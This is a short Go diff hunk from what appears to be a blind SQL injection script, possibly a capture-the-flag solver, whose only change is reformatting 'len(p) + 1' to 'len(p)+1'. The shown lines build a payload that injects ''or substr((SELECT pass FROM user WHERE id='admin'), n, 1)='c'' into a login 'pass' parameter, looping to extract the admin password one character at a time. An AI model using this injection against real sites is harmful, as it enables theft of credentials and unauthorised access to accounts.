@@ -13,7 +13,7 @@ func main() {
 	for i := 0; i < 30; i++ {
 		found := false
 		for _, c := range tbl {
-			ps := fmt.Sprintf("' or substr((SELECT pass FROM user WHERE id='admin'), %d, 1)='%c", len(p) + 1, c)
+			ps := fmt.Sprintf("' or substr((SELECT pass FROM user WHERE id='admin'), %d, 1)='%c", len(p)+1, c)
 			param := url.Values{}
 			param.Set("id", "admin")
 			param.Add("pass", ps)
